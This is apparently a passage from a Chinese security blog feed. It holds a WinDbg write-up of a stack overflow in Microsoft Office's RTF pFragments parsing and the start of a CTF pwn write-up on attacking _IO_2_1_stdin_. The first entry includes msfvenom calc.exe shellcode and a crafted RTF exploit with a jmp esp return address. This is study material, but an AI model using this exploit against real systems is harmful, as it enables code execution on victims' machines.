mso!Ordinal6426+0x648:
30e9eb83 8bc1            mov     eax,ecx
0:000&gt; t
eax=0000c8ac ebx=05000000 ecx=0000c8ac edx=00000000 esi=1104000c edi=00123dc0
eip=30e9eb85 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x64a:
30e9eb85 c1e902          shr     ecx,2
0:000&gt; t
eax=0000c8ac ebx=05000000 ecx=0000322b edx=00000000 esi=1104000c edi=00123dc0
eip=30e9eb88 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x64d:
30e9eb88 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
</code></pre>
<p>可以看到ecx=0000c8ac，及复制数据的大小，由于操作dword字节，因此要除以4</p>
<pre><code>0:000&gt; db esi
1104000c  41 61 30 41 61 31 41 61-32 41 61 33 41 61 34 41  Aa0Aa1Aa2Aa3Aa4A
1104001c  61 35 41 61 36 41 61 37-41 61 38 41 61 39 41 62  a5Aa6Aa7Aa8Aa9Ab
1104002c  30 41 62 31 41 62 32 41-62 33 41 62 34 41 62 35  0Ab1Ab2Ab3Ab4Ab5
1104003c  41 62 36 41 62 37 41 62-38 41 62 39 41 63 30 41  Ab6Ab7Ab8Ab9Ac0A
1104004c  63 31 41 63 32 41 63 33-41 63 34 41 63 35 41 63  c1Ac2Ac3Ac4Ac5Ac
1104005c  36 41 63 37 41 63 38 41-63 39 41 64 30 41 64 31  6Ac7Ac8Ac9Ad0Ad1
1104006c  41 64 32 41 64 33 41 64-34 41 64 35 41 64 36 41  Ad2Ad3Ad4Ad5Ad6A
1104007c  64 37 41 64 38 41 64 39-41 65 30 41 65 31 41 65  d7Ad8Ad9Ae0Ae1Ae
</code></pre>
<p>可以看到目标地址edi与ebp刚好相差0x10，因为复制的内存过大，可以覆盖返回地址</p>
<p>没复制时</p>
<pre><code>0:000&gt; dp ebp
00123dd0  00123e00 30f4cdbd 00123f3c 00000000
00123de0  ffffffff 00000000 014d14e0 00124420
00123df0  0012408c 00124e38 001240b0 00000000
00123e00  00123fe4 30f4a597 00123f88 00123f3c
00123e10  00000000 014d14e0 0012408c 00124420
00123e20  00000000 ffffffff ffffffff ffffffff
00123e30  00000000 20000000 00000101 00000000
00123e40  ffffffff ffffffff ffffffff 00000000
</code></pre>
<p>复制后</p>
<pre><code>0:000&gt; dp 00123dc0
00123dc0  41306141 61413161 33614132 41346141
00123dd0  61413561 37614136 41386141 62413961#ebp处的值已被覆盖，
00123de0  31624130 41326241 62413362 35624134
00123df0  41366241 62413762 39624138 41306341
00123e00  63413163 33634132 41346341 63413563
00123e10  37634136 41386341 64413963 31644130
00123e20  41326441 64413364 35644134 41366441
00123e30  64413764 39644138 41306541 65413165
</code></pre>
<p>用msfvenole编写payload</p>
<pre><code>msf5 &gt; msfvenom -a x86 -p windows/exec cmd=calc.exe -f hex
[*] exec: msfvenom -a x86 -p windows/exec cmd=calc.exe -f hex

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 193 bytes
Final size of hex file: 386 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500
</code></pre>
<pre><code>{\rtf1{\shp{\sp{\sn pFragments}{\sv 3;1;111111110010
4161304161314161324161334161344161354161c83ad977
0000000000000000000000000000000000000000
fce8820000006089e531c0648b50308b520c8b52148b72280f
b74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c
8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf
0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d3
8b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b2
0000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe0
7505bb4713726f6a0053ffd563616c632e65786500}}}}
</code></pre>
<p>这里采用的是跳板jmp esp，地址为0x77d93ac8</p>
<pre><code>30e9eb8f f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
0:000&gt; p
eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=0d3a100c edi=00124dc0
eip=30e9eb91 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal6426+0x656:
30e9eb91 5e              pop     esi
0:000&gt; p
eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00124dc0
eip=30e9eb92 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal6426+0x657:
30e9eb92 5f              pop     edi
0:000&gt; p
eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
eip=30e9eb93 esp=00123da0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal6426+0x658:
30e9eb93 c20c00          ret     0Ch
0:000&gt; p
eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc96 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f47:
30f4cc96 8b4514          mov     eax,dword ptr [ebp+14h] ss:0023:00123de4=67666564
0:000&gt; p
eax=67666564 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc99 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f4a:
30f4cc99 ff7518          push    dword ptr [ebp+18h]  ss:0023:00123de8=61006968
0:000&gt; p
eax=67666564 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc9c esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f4d:
30f4cc9c 8b55f0          mov     edx,dword ptr [ebp-10h] ss:0023:00123dc0=41306141
0:000&gt; p
eax=67666564 ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cc9f esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f50:
30f4cc9f f7d8            neg     eax
0:000&gt; p
eax=98999a9c ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cca1 esp=00123dac ebp=00123dd0 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
mso!Ordinal753+0x2f52:
30f4cca1 1bc0            sbb     eax,eax
0:000&gt; p
eax=ffffffff ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cca3 esp=00123dac ebp=00123dd0 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
mso!Ordinal753+0x2f54:
30f4cca3 8d4df8          lea     ecx,[ebp-8]
0:000&gt; p
eax=ffffffff ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cca6 esp=00123dac ebp=00123dd0 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
mso!Ordinal753+0x2f57:
30f4cca6 23c1            and     eax,ecx
0:000&gt; p
eax=00123dc8 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cca8 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f59:
30f4cca8 50              push    eax
0:000&gt; p
eax=00123dc8 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cca9 esp=00123da8 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f5a:
30f4cca9 ff7508          push    dword ptr [ebp+8]    ss:0023:00123dd8=64636261
0:000&gt; p
eax=00123dc8 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4ccac esp=00123da4 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f5d:
30f4ccac e86cfeffff      call    mso!Ordinal753+0x2dce (30f4cb1d)
0:000&gt; p
(1a0.624): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=3a77d858 ebx=00000000 ecx=00123d90 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4ce4a esp=00123d88 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
mso!Ordinal753+0x30fb:
30f4ce4a 8b5004          mov     edx,dword ptr [eax+4] ds:0023:3a77d85c=????????
0:000&gt; p
eax=3a77d858 ebx=00000000 ecx=00123abc edx=41306141 esi=014d10f0 edi=00123f88
eip=7c92e460 esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!KiUserExceptionDispatcher+0x4:
7c92e460 8b1c24          mov     ebx,dword ptr [esp]  ss:0023:00123a98=00123aa0
0:000&gt; p
eax=3a77d858 ebx=00123aa0 ecx=00123abc edx=41306141 esi=014d10f0 edi=00123f88
eip=7c92e463 esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!KiUserExceptionDispatcher+0x7:
7c92e463 51              push    ecx
0:000&gt; p
eax=3a77d858 ebx=00123aa0 ecx=00123abc edx=41306141 esi=014d10f0 edi=00123f88
eip=7c92e464 esp=00123a94 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!KiUserExceptionDispatcher+0x8:
7c92e464 53              push    ebx
0:000&gt; p
eax=3a77d858 ebx=00123aa0 ecx=00123abc edx=41306141 esi=014d10f0 edi=00123f88
eip=7c92e465 esp=00123a90 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!KiUserExceptionDispatcher+0x9:
7c92e465 e8e6c40100      call    ntdll!towlower+0x12a (7c94a950)
0:000&gt; p
eax=00000000 ebx=00123aa0 ecx=00000000 edx=7c92e4f4 esi=014d10f0 edi=00123f88
eip=7c92e46a esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiUserExceptionDispatcher+0xe:
7c92e46a 0ac0            or      al,al
0:000&gt; p
eax=00000000 ebx=00123aa0 ecx=00000000 edx=7c92e4f4 esi=014d10f0 edi=00123f88
eip=7c92e46c esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiUserExceptionDispatcher+0x10:
7c92e46c 740c            je      ntdll!KiUserExceptionDispatcher+0x1e (7c92e47a) [br=1]
</code></pre>
<pre><code>eax=00000000 ebx=00123aa0 ecx=00000000 edx=7c92e4f4 esi=014d10f0 edi=00123f88
eip=7c92e47a esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiUserExceptionDispatcher+0x1e:
7c92e47a 5b              pop     ebx
0:000&gt; p
eax=00000000 ebx=00123aa0 ecx=00000000 edx=7c92e4f4 esi=014d10f0 edi=00123f88
eip=7c92e47b esp=00123a9c ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiUserExceptionDispatcher+0x1f:
7c92e47b 59              pop     ecx
0:000&gt; p
eax=00000000 ebx=00123aa0 ecx=00123abc edx=7c92e4f4 esi=014d10f0 edi=00123f88
eip=7c92e47c esp=00123aa0 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiUserExceptionDispatcher+0x20:
7c92e47c 6a00            push    0
0:000&gt; p
eax=00000000 ebx=00123aa0 ecx=00123abc edx=7c92e4f4 esi=014d10f0 edi=00123f88
eip=7c92e47e esp=00123a9c ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiUserExceptionDispatcher+0x22:
7c92e47e 51              push    ecx
0:000&gt; p
eax=00000000 ebx=00123aa0 ecx=00123abc edx=7c92e4f4 esi=014d10f0 edi=00123f88
eip=7c92e47f esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiUserExceptionDispatcher+0x23:
7c92e47f 53              push    ebx
0:000&gt; p
eax=00000000 ebx=00123aa0 ecx=00123abc edx=7c92e4f4 esi=014d10f0 edi=00123f88
eip=7c92e480 esp=00123a94 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiUserExceptionDispatcher+0x24:
7c92e480 e80bf5ffff      call    ntdll!ZwRaiseException (7c92d990)
0:000&gt; p
(1a0.624): Access violation - code c0000005 (!!! second chance !!!)
eax=3a77d858 ebx=00000000 ecx=00123d90 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4ce4a esp=00123d88 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal753+0x30fb:
30f4ce4a 8b5004          mov     edx,dword ptr [eax+4] ds:0023:3a77d85c=????????
</code></pre>
<p>可以发现在这里出错了，因此需要跳过je就直接结束</p>
<p>这里先mov     eax,dword ptr [ebp+14h] ，neg     eax求补，</p>
<pre><code>30e9eb8f f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
0:000&gt; p
eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=0d39100c edi=00124dc0
eip=30e9eb91 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal6426+0x656:
30e9eb91 5e              pop     esi
0:000&gt; p
eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00124dc0
eip=30e9eb92 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal6426+0x657:
30e9eb92 5f              pop     edi
0:000&gt; p
eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
eip=30e9eb93 esp=00123da0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal6426+0x658:
30e9eb93 c20c00          ret     0Ch
0:000&gt; p
eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc96 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f47:
30f4cc96 8b4514          mov     eax,dword ptr [ebp+14h] ss:0023:00123de4=00000000
0:000&gt; p
eax=00000000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc99 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f4a:
30f4cc99 ff7518          push    dword ptr [ebp+18h]  ss:0023:00123de8=00000000
0:000&gt; p
eax=00000000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc9c esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f4d:
30f4cc9c 8b55f0          mov     edx,dword ptr [ebp-10h] ss:0023:00123dc0=41306141
0:000&gt; p
eax=00000000 ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cc9f esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f50:
30f4cc9f f7d8            neg     eax
0:000&gt; p
eax=00000000 ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cca1 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f52:
30f4cca1 1bc0            sbb     eax,eax
0:000&gt; p
eax=00000000 ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cca3 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f54:
30f4cca3 8d4df8          lea     ecx,[ebp-8]
0:000&gt; p
eax=00000000 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cca6 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f57:
30f4cca6 23c1            and     eax,ecx
0:000&gt; p
eax=00000000 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cca8 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f59:
30f4cca8 50              push    eax
0:000&gt; p
eax=00000000 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cca9 esp=00123da8 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f5a:
30f4cca9 ff7508          push    dword ptr [ebp+8]    ss:0023:00123dd8=00000000
0:000&gt; p
eax=00000000 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4ccac esp=00123da4 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f5d:
30f4ccac e86cfeffff      call    mso!Ordinal753+0x2dce (30f4cb1d)
0:000&gt; p
eax=00000000 ebx=05000000 ecx=e0040057 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4ccb1 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f62:
30f4ccb1 84c0            test    al,al
0:000&gt; p
eax=00000000 ebx=05000000 ecx=e0040057 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4ccb3 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f64:
30f4ccb3 0f8498000000    je      mso!Ordinal753+0x3002 (30f4cd51)        [br=1]
0:000&gt; p
eax=00000000 ebx=05000000 ecx=e0040057 edx=41306141 esi=014d10f0 edi=00123f88
eip=30f4cd51 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x3002:
30f4cd51 5e              pop     esi
0:000&gt; p
eax=00000000 ebx=05000000 ecx=e0040057 edx=41306141 esi=00000000 edi=00123f88
eip=30f4cd52 esp=00123db4 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x3003:
30f4cd52 5b              pop     ebx
0:000&gt; p
eax=00000000 ebx=00000000 ecx=e0040057 edx=41306141 esi=00000000 edi=00123f88
eip=30f4cd53 esp=00123db8 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x3004:
30f4cd53 5f              pop     edi
0:000&gt; p
eax=00000000 ebx=00000000 ecx=e0040057 edx=41306141 esi=00000000 edi=00000000
eip=30f4cd54 esp=00123dbc ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x3005:
30f4cd54 c9              leave
0:000&gt; p
eax=00000000 ebx=00000000 ecx=e0040057 edx=41306141 esi=00000000 edi=00000000
eip=30f4cd55 esp=00123dd4 ebp=61413561 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x3006:
30f4cd55 c21400          ret     14h
</code></pre>
<p>可以看到在call    mso!Ordinal753+0x2dce (30f4cb1d)这后面开始出现分歧了</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻击 _IO_2_1_stdin_绕过对输入字节的限制]]></title>
        <id>https://czh11.github.io/post/gong-ji-_io_2_1_stdin_-rao-guo-dui-shu-ru-zi-jie-de-xian-zhi/</id>
        <link href="https://czh11.github.io/post/gong-ji-_io_2_1_stdin_-rao-guo-dui-shu-ru-zi-jie-de-xian-zhi/">
        </link>
        <updated>2020-12-19T13:30:33.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界- echo_back</p>
<p>查看保护</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec echo_back
[*] '/home/giantbranch/Desktop/echo_back'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<p>全开</p>
<p>查看一下反汇编的代码</p>
<pre><code>unsigned __int64 __fastcall sub_B80(_BYTE *a1)
{
  size_t nbytes; // [rsp+1Ch] [rbp-14h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset((char *)&amp;nbytes + 4, 0, 8uLL);
  printf(&quot;length:&quot;, 0LL);
  _isoc99_scanf(&quot;%d&quot;, &amp;nbytes);
  getchar();
  if ( (nbytes &amp; 0x80000000) != 0LL || (signed int)nbytes &gt; 6 )
    LODWORD(nbytes) = 7;
  read(0, (char *)&amp;nbytes + 4, (unsigned int)nbytes);
  if ( *a1 )
    printf(&quot;%s say:&quot;, a1);
  else
    printf(&quot;anonymous say:&quot;, (char *)&amp;nbytes + 4);
  printf((const char *)&amp;nbytes + 4);
  return __readfsqword(0x28u) ^ v3;
}
</code></pre>
<p>发现有格式化字符串漏洞，就可以通过它来泄露一些基址，或写进一些数据，发现现在我们输入为7个字节，这里就只能通过攻击scanf函数来绕过7字节的输入。</p>
<p>关于scanf输入的一些内部结构：</p>
<pre><code>int _IO_new_file_underflow (_IO_FILE *fp)
{
  _IO_ssize_t count;
#if 0
  /* SysV does not make this test; take it out for compatibility */
  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
    return (EOF);
#endif

  if (fp-&gt;_flags &amp; _IO_NO_READS)
    {
      fp-&gt;_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /
  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)              //
    return *(unsigned char *) fp-&gt;_IO_read_ptr;        //

  if (fp-&gt;_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp-&gt;_IO_save_base != NULL)
    {
      free (fp-&gt;_IO_save_base);
      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;
    }
      _IO_doallocbuf (fp);
    }

  /* Flush all line buffered files before reading. */
  /* FIXME This can/should be moved to genops ?? */
  if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
#if 0
      _IO_flush_all_linebuffered ();
#else
      /* We used to flush all line-buffered stream.  This really isn't
     required by any standard.  My recollection is that
     traditional Unix systems did this for stdout.  stderr better
     not be line buffered.  So we do just that here
     explicitly.  --drepper */
      _IO_acquire_lock (_IO_stdout);

      if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
      == (_IO_LINKED | _IO_LINE_BUF))
    _IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
#endif
    }

  _IO_switch_to_get_mode (fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;
  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;
  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end
    = fp-&gt;_IO_buf_base;
  //
  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,                 //
               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);         //
 
  if (count &lt;= 0)
    {
      if (count == 0)
    fp-&gt;_flags |= _IO_EOF_SEEN;
      else
    fp-&gt;_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp-&gt;_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
     handles.  As a result, our offset cache would no longer be valid, so
     unset it.  */
      fp-&gt;_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp-&gt;_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp-&gt;_offset, count);
  return *(unsigned char *) fp-&gt;_IO_read_ptr;
}
</code></pre>
<p>这里有两个关键的地方，第一个就是让fp-&gt;_IO_read_ptr 不等于 fp-&gt;_IO_read_end，使函数不返回fp-&gt;_IO_read_ptr</p>
<p>第二个就是_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);向IO_buf_base写入_IO_buf_end-IO_buf_base大小的数据</p>
<p>这里先泄露处libc的基址，程序的基址，和ebp的值</p>
<p>然后查看下 _IO_2_1_stdin_的情况：</p>
<pre><code>gdb-peda$ p _IO_2_1_stdin_
$6 = {
  file = {
    _flags = 0xfbad208b, 
    _IO_read_ptr = 0x7f763298e964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
    _IO_read_end = 0x7f763298e964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
    _IO_read_base = 0x7f763298e963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
    _IO_write_base = 0x7f763298e963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
    _IO_write_ptr = 0x7f763298e963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
    _IO_write_end = 0x7f763298e963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
    _IO_buf_base = 0x7f763298e963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
    _IO_buf_end = 0x7f763298e964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0x0, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffffffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = &quot;\n&quot;, 
